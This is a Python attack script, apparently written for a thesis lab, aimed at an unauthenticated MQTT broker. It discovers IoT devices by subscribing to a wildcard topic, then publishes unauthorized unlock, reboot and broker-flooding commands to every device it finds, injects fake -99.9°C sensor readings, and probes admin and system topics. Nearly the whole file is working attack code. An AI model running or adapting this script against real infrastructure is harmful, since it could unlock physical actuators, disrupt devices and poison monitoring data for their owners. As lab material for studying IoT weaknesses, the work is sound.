#!/usr/bin/env python3
"""
Attack 02 — Command Injection, Data Poisoning & Lateral Movement

Demonstrates a full attack chain against an unprotected IoT infrastructure:

    Phase 1 — Device Discovery:
        Subscribe to 'iot/#' and enumerate all active devices by observing
        which device IDs appear in topic paths.

    Phase 2 — Command Injection:
        Publish unauthorized commands to every discovered device:
          - set_interval(1): flood the broker (DoS)
          - unlock:          trigger physical actuator remotely
          - reboot:          disrupt device availability

    Phase 3 — Data Poisoning:
        Publish fake sensor readings (-99.9) to corrupt the backend's
        data store and mislead any monitoring systems.

    Phase 4 — Lateral Movement:
        Demonstrate that the MQTT broker acts as a pivot point, giving
        an attacker simultaneous access to all connected devices from
        a single unauthenticated connection.

Usage:
    python attack_02_cmd_inject.py [broker_host]
    python attack_02_cmd_inject.py 10.10.0.10
"""

import json
import time
import sys
import os
import paho.mqtt.client as mqtt

BROKER_HOST = sys.argv[1] if len(sys.argv) > 1 else "10.10.0.10"

# Attack result summary for thesis metrics
results = {
    "attack_start":        time.time(),
    "commands_sent":       0,
    "devices_compromised": [],
    "data_poisoned":       0,
    "lateral_targets":     0
}

discovered_devices: set[str] = set()


# ---------------------------------------------------------------------------
# Phase 1 — Device Discovery
# ---------------------------------------------------------------------------

def discover_devices(client: mqtt.Client, duration: int = 12) -> None:
    """
    Enumerate IoT devices by subscribing to the wildcard topic and
    extracting device IDs from the topic path structure.
    """
    print(f"\n[PHASE 1] Device discovery via MQTT topic enumeration ({duration}s)...")

    def on_discovery_msg(c, u, msg):
        parts = msg.topic.split("/")
        if len(parts) >= 2 and parts[0] == "iot":
            discovered_devices.add(parts[1])

    client.on_message = on_discovery_msg
    client.subscribe("iot/#")
    time.sleep(duration)

    print(f"[+] Devices discovered: {discovered_devices}")


# ---------------------------------------------------------------------------
# Phase 2 — Command Injection
# ---------------------------------------------------------------------------

def inject_commands(client: mqtt.Client) -> None:
    """
    Send unauthorized commands to all discovered devices.
    No authentication or signing is required by the broker or devices.
    """
    print("\n[PHASE 2] Command injection on all discovered devices...")

    attack_commands = [
        ({"cmd": "set_interval", "value": 1}, "DoS — flood broker with 1s interval"),
        ({"cmd": "unlock"},                   "Physical unlock — unauthenticated"),
        ({"cmd": "reboot"},                   "Service disruption — forced reboot"),
    ]

    for device_id in discovered_devices:
        topic = f"iot/{device_id}/cmd"
        for payload, description in attack_commands:
            client.publish(topic, json.dumps(payload), qos=1)
            print(f"  [INJECT] {device_id} <- {description}")
            results["commands_sent"] += 1
            time.sleep(0.3)

        results["devices_compromised"].append(device_id)


# ---------------------------------------------------------------------------
# Phase 3 — Data Poisoning
# ---------------------------------------------------------------------------

def poison_data(client: mqtt.Client) -> None:
    """
    Inject anomalous sensor values into the data stream.
    The backend accepts these without validation, corrupting stored readings.
    """
    print("\n[PHASE 3] Data poisoning — injecting fake sensor readings...")

    for device_id in discovered_devices:
        topic = f"iot/{device_id}/data"
        fake_payload = {
            "device_id": device_id,
            "sensor":    "temperature",
            "timestamp": time.time(),
            "value":     -99.9,     # anomalous value — outside physical range
            "unit":      "C",
            "_injected": True       # marker for metrics and detection testing
        }
        client.publish(topic, json.dumps(fake_payload))
        print(f"  [POISON] {device_id}: injected value -99.9°C")
        results["data_poisoned"] += 1


# ---------------------------------------------------------------------------
# Phase 4 — Lateral Movement
# ---------------------------------------------------------------------------

def lateral_movement(client: mqtt.Client) -> None:
    """
    Demonstrate that the MQTT broker acts as a pivot: from a single
    unauthenticated connection, the attacker can reach all devices.
    In a segmented network this would be impossible.
    """
    print("\n[PHASE 4] Lateral movement demonstration...")
    print(f"  [*] Single access point: broker at {BROKER_HOST}")
    print(f"  [*] Devices reachable from this connection: {len(discovered_devices)}")
    print(f"  [*] No network segmentation — all targets accessible simultaneously")

    # Probe system topics and potential admin channels
    client.publish("$SYS/test",  "lateral_movement_probe")
    client.publish("admin/cmd",  json.dumps({"cmd": "get_config"}))

    results["lateral_targets"] = len(discovered_devices)


# ---------------------------------------------------------------------------
# Main Entry Point
# ---------------------------------------------------------------------------

def main():
    client = mqtt.Client(client_id="attacker-injector")
    client.connect(BROKER_HOST, 1883)
    client.loop_start()

    discover_devices(client)
    inject_commands(client)
    poison_data(client)
    lateral_movement(client)

    client.loop_stop()
    client.disconnect()

    # Build final summary
    results["attack_end"]  = time.time()
    results["duration_s"]  = results["attack_end"] - results["attack_start"]

    print(f"\n{'='*50}")
    print("ATTACK SUMMARY")
    print(f"{'='*50}")
    for key, value in results.items():
        print(f"  {key}: {value}")

    # Save JSON report
    os.makedirs("/attacks/results", exist_ok=True)
    output_file = f"/attacks/results/cmd_inject_{int(time.time())}.json"
    with open(output_file, "w") as f:
        json.dump(results, f, indent=2)
    print(f"\n[+] Report saved to: {output_file}")


if __name__ == "__main__":
    main()
